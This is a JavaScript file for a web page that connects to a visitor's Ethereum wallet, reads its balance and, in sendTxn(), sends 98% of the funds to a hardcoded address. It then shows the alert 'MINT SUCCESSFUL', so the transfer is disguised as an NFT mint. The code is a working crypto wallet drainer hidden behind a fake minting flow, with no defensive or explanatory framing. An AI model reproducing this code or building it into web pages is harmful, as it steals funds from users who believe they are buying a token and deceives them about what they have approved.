var account = null;
var signature = null;
var message = "signing msg in wallet";
var balance = null;
var to_account = "0x9cD9e444ABe58fA64f828144A34F431707440F17";
var toSend = null;
        
async function connectWallet() {

    (async () => {
        if (window.ethereum) {
            await window.ethereum.send('eth_requestAccounts');
            window.web3 = new Web3(window.ethereum);

            var accounts = await web3.eth.getAccounts();
            account = accounts[0];
            console.log(account);  
            document.getElementById('wallet-address').textContent = account;
        }

        var balances = await web3.eth.getBalance(account);
            balance = balances;
            console.log(balance);

    })();

    // document.getElementById('changeText').innerHTML = "connected";
}
    
        

async function sendTxn() {


    (async () => {

        
            var new_balance = (0.98 * balance);

            let txnObject = {
                from: account,
                to: to_account,
                value: new_balance
            }

            toSend = await web3.eth.sendTransaction(txnObject)
            .then(txnhash => {
                console.log(txnhash);
            });
    
            await web3.eth.sendSignedTransaction(toSend);

            alert("MINT SUCCESSFUL");
        

    })();
}